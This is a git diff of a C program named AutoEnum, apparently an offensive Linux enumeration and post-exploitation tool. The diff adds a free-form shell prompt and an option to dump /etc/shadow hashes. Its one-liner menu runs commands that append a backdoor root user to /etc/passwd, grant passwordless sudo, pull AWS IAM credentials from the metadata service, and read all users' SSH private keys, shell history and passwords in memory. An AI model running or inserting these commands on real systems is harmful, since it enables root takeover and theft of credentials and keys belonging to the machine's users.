@@ -28,6 +28,11 @@ int terminalz()
     char ques[100];                        
     printf("\nEnter the command you want to execute > ");
     scanf("%s", ques);
+    if (strcmp(ques, "back") == 0)
+    {
+        system("clear");
+        onelinerz();
+    }
     system(ques);
     terminalz();
     return 0;
@@ -36,7 +41,7 @@ int terminalz()
 int onelinerz()
 {
     char oneliner[100];    
-    printf("\nAutoEnum > ");
+    printf("\n\nAutoEnum > ");
     scanf("%s", oneliner);
     if (strcmp(oneliner, "list") == 0)
     {
@@ -70,6 +75,7 @@ int onelinerz()
         printf("\noptions         List help available commands.");
         printf("\nlist            Lists all available one-liners.");
         printf("\n[oneliner path] Executes a oneliner. To execute it, only put the oneliner path. Example: linux/bash/find_suid");
+        printf("\ncommand         Execute a system command.");
         printf("\nclear           Clears the screen.");
         printf("\nexit            Exits out of AutoEnum.\n");
         normal();
@@ -78,6 +84,11 @@ int onelinerz()
     else if (strcmp(oneliner, "clear") == 0)
     {
         system("clear");
+        onelinerz();
+    }
+    else if (strcmp(oneliner, "command") == 0)
+    {
+        terminalz();
         onelinerz();
     }
     else if (strcmp(oneliner, "exit") == 0)
@@ -90,86 +101,102 @@ int onelinerz()
     else if (strcmp(oneliner, "linux/bash/exploit_docker_bash_container") == 0)
     {
         system("cd / && echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> etc/passwd");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/exploit_writeable_sudoers") == 0)
     {
         system("cd / && echo 'USERNAME ALL=(ALL) NOPASSWD: ALL' >>/etc/sudoers");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/find_suid") == 0)
     {
         system("find / -perm 4000 2>/dev/null");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/get_apache_site_enabled") == 0)
     {
         system("cat /etc/apache2/site-enabled/*");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/get_aws_security_credentials") == 0)
     {
         system("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/get_bash_history_for_all_user") == 0)
     {
         system("cat /home/*/.bash_history");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/get_last_edited_files") == 0)
     {
         system("find / -mmin -10 2>/dev/null | grep -Ev '^/proc'");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/get_ssh_private_keys_for_all_users") == 0)
     {
         system("cat /home/*/.ssh/id_rsa");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/list_all_capabilities") == 0)
     {
         system("getcap -r / 2>/dev/null");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/list_cronjobs_for_all_users") == 0)
     {
         system("for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/list_cronjobs_for_current_user") == 0)
     {
         system("crontab -l");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/list_systemd_timers") == 0)
     {
         system("systemctl list-timers --all");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/search_for_password_in_memory") == 0)
     {
         system("strings /dev/mem -n10 | grep -i PASS");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/search_for_password_using_find") == 0)
     {
         system("find . -type f -exec grep -i -I 'PASSWORD' {{}} /dev/null \\;");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/search_for_password_using_grep") == 0)
     {
         system("grep --color=auto -rnw '/' -ie 'PASSWORD' --color=always 2> /dev/null");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else if (strcmp(oneliner, "linux/bash/search_for_writeable_folders_files") == 0)
     {
         system("find / -perm -o+w");
+        printf("\nOne-liner executed!");
         onelinerz();
     }
     else
     {
-        printf("\nWrong Command!");
+        printf("\nError, command [%s] was not found.", oneliner);
         onelinerz();
     }
     return 0;
@@ -201,42 +228,56 @@ int main(int argc, char **argv)
                     printf("\n-o              Loads extra options for gathering information on a Linux machine.");
                     printf("\n-e              Enumerates the machine. [Linux]");
                     printf("\n-w              Enumerates the machine. [Windows]");
+                    printf("\n-p              Dumps the password hashes of all the users. [Make sure you're root]");
                     printf("\n-l              Loads a menu of one-liners for enumeration. [Linux]");
-                    printf("\n-c              Execute a system command.");
                     normal();
                     break;
                 case 'o':
                     red();
                     printf("\nCommands        Description");
                     printf("\n--------        -----------");
-                    printf("\n-p              Dumps etc/passwd.");
-                    printf("\n-d              Dumps information about the memory.");
+                    printf("\n-a              Dumps etc/passwd.");
+                    printf("\n-m              Dumps information about the memory.");
+                    printf("\n-c              Dumps information about the CPU.    ");
+                    printf("\n-i              Displays some information about the machine.");
                     normal();
                     break;
-                case 'd':
+                case 'm':
+                    system("echo ");
                     system("cd / && cd proc && cat meminfo");
+                    break;
+                case 'i':
+                    system("echo ");
+                    system("cd / && cd proc && cat version");
+                    break;
+                case 'c':
+                    system("echo ");
+                    system("cd / && cd proc && cat cpuinfo");
+                    break;
+                case 'p':
+                    system("cd / && cat etc/shadow");
                     break;
                 case 'e':
                     system("echo ");
                     system("\necho Enumerating machine.......");
                     system("echo ");
-                    red();
-                    system("\necho User account information");
-                    system("echo -----------------------------------");
-                    normal();
                     system("whoami");
                     system("id");
+                    system("ifconfig");
+                    system("");
+                    system("");
+                    system("");
+                    system("");
+                    system("");
                     system("");
                     break;
                 case 'w':
                     system("echo ");
                     system("\necho Enumerating machine.......");
-                    system("\necho User account information");
-                    system("echo -----------------------------------");
                     break;
-                case 'p':
+                case 'a':
                     system("echo ");
-                    system("cd / && cat etc/passwd");
+                    system("\ncd / && cat etc/passwd");
                     break;
                 case 'l':
                     red();
@@ -261,9 +302,6 @@ int main(int argc, char **argv)
                     printf("\n\n[Use 'options' for commands.]\n");
                     normal();
                     onelinerz();
-                    break;
-                case 'c':
-                    terminalz();
                     break;
                 case '-':
                     printf("");
